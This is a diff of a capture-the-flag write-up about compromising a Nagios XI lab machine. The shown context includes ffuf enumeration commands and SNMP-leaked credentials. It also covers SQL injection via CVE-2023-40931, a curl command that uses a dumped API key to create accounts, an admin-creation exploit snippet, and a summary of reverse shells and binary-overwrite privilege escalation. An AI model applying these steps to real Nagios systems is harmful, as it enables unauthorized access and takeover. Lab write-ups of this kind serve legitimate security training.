@@ -78,7 +78,7 @@ we need to add the line `<machine-ip> nagios.monitored.htb` to `/etc/hosts`. Aft
 <img src="../figs/monitored1.png" alt="landing page">
 
 If we click on "Access Nagios", we will be brought to a login page, at `/nagiosxi/login.php`. I've tried to brute-force it and
-send send SQL injection payloads, but that did not work. We know that this service is called Nagios XI, so my next step was to
+send send SQL injection payloads, but with no success. We know that this service is called Nagios XI, so my next step was to
 look for common vulnerabilities revolving around this service. Upon a quick search, we find [this](https://outpost24.com/blog/nagios-xi-vulnerabilities/) blog about Nagios XI CVEs. One that stands out to me is the first one, CVE-2023-40931. It reads:
 
 > Nagios XI features “Announcement Banners”, which can optionally be acknowledged by users. The endpoint for this feature is vulnerable to a SQL Injection attack.
@@ -87,8 +87,7 @@ look for common vulnerabilities revolving around this service. Upon a quick sear
 > 
 > The ID parameter is assumed to be trusted but comes directly from the client without sanitization. This leads to a SQL Injection where an authenticated user with low or no privileges can retrieve sensitive data, such as from the `xi_session` and `xi_users` table containing data such as emails, usernames, hashed passwords, API tokens, and backend tickets.
 
-As we can see, this vulnerability seems plausible, but we need a way in, since it only works if we have at least
-access to a low privileged user. 
+As we can see, this vulnerability only works if we have at least access to a low privileged user. We need a way in to test it. 
 
 I've ran `ffuf -u http://nagios.monitored.htb/nagiosxi/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt` to enumerate endpoints and this is what I've got:
 
@@ -111,14 +110,14 @@ api                     [Status: 301, Size: 337, Words: 20, Lines: 10, Duration:
 terminal                [Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 204ms]
 ```
 
-The only interesting endpoint is `terminal`, which seems to be a terminal access to the server. 
+At first glance, the only interesting endpoint is `terminal`, which seems to be a terminal access to the server. 
 
 <img src="../figs/monitored2.png" alt="terminal endpoint">
 
 However, this is not useful unless we have credentials to login. 
 
-We also see that there is an API endpoint, which might contain information disclosure or other ways in. However, after enumerating it, all I got was 403 status codes. Ok, let's step back a little. We have found some interesting vectors, but we might need to 
-find the credentials ourselves within the recon. According to Nagios XI documentation, it seems to be a network monitoring system. 
+Ok, let's step back a little. We have found some interesting vectors, but we might need to 
+find the credentials. According to Nagios XI documentation, the service seems to be a network monitoring system. 
 With a bit of research, we find [this](https://www.nagios.com/solutions/snmp-monitoring/) page stating that Nagios XI provides complete monitoring of SNMP (Simple Network Message Protocol). SNMP runs on UDP port 161/162, and that was not shown on our first 
 Nmap scan. This is because we have not specified it to perform a UDP scan. Let's re-run Nmap with that in mind now:
 
@@ -286,7 +285,7 @@ All of them giving a 200 status code indicates the server is just sending us som
 $ ffuf -u https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt -s > api-endpoints.txt
 ```
 
-Note that most of them gives the same message: `Message {"error":"No API Key provided"}`. That being noted, we will write a python script to see if there is any other messages within these:
+ Note that most of the messages are: `Message {"error":"No API Key provided"}`.That being noted, we will write a python script to see if there is any other messages within these:
 
 ```python
 import requests
@@ -397,7 +396,7 @@ Table: xi_users
 
 And we found the administrator's API key and password. Using [Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/) we can see that the password is using bcrypt hash. I've tried to find a match with John The Ripper, but with no success. So this got me thinking... Maybe we can use the administrator API key to create another admin account within Nagios XI, then log in with it.
 Again, with a bit research, we can find [this](https://support.nagios.com/forum/viewtopic.php?f=16&t=42923) topic, where it says
-we can create an accout with this cURL command `curl -XPOST "http://x.x.x.x/nagiosxi/api/v1/system/user?apikey=LTltbjobR0X3V5ViDIitYaI8hjsjoFBaOcWYukamF7oAsD8lhJRvSPWq8I3PjTf7&pretty=1" -d "username=jmcdouglas&password=test&name=Jordan%20McDouglas&email=jmcdouglas@localhost"`. However, this will create a normal user. We need an admin user. Then, I found (this)[https://www.exploit-db.com/exploits/44969] on exploit-db, which is a completely different exploit, but has these lines:
+we can create an accout with this cURL command `curl -XPOST "http://x.x.x.x/nagiosxi/api/v1/system/user?apikey=LTltbjobR0X3V5ViDIitYaI8hjsjoFBaOcWYukamF7oAsD8lhJRvSPWq8I3PjTf7&pretty=1" -d "username=jmcdouglas&password=test&name=Jordan%20McDouglas&email=jmcdouglas@localhost"`. However, this will create a normal user. We need an admin user. Then, I found [this](https://www.exploit-db.com/exploits/44969) on exploit-db, which is a completely different exploit, but has these lines:
 
 ```python
   def try_add_admin(key, username, passwd)
@@ -517,7 +516,7 @@ nagios@monitored:~$ sudo /usr/local/nagiosxi/scripts/manage_services.sh status n
              └─727 /usr/local/nagios/bin/npcd -f /usr/local/nagios/etc/pnp/npcd.cfg
 ```
 
-As we can see, the `npcd.service` calls `/usr/share/nagios/bin/npcd` when running. But we also have write privileges on this directory and in the file:
+As we can see, the `npcd.service` calls `/usr/share/nagios/bin/npcd` when running, and we also have write privileges on this directory and in the file:
 
 ```bash
 nagios@monitored:~$ ls -la /usr/local/nagios/bin
@@ -567,7 +566,7 @@ We successfully overwritten the npcd binary. Now, we start another netcat on por
 
 This was a nice ride. Lots of rabbit holes along the way, but lots of new things learned. We were able to find our way in the website by first using snmpwalk which leaked some unprivileged user credentials. With these, we were able to create authentication tokens at `/nagiosxi/api/v1/authenticate` endpoint, which were then used to test a SQL injection at `/nagiosxi/admin/banner_message-ajaxhelper.php` endpoint. With SQLMap, we were able to retrieve the administrator API key, which was used to create a new admin account under Nagios XI. Then, this newly created admin account provided us the opportunity to run a reverse shell within Nagios XI commands, granting us the user shell.
 
-From there, we simply listed all sudo commands that we could run without a password to find one that used service running from a binary that we had written permissions. We added our second reverse shell payload into it, restarted the service, and got the root shell.
+From there, we simply listed all sudo commands that we could run without a password to find one that used service running from a binary that we had write permissions. We added our second reverse shell payload into it, restarted the service, and got the root shell.
 
 Simply amazing!
 
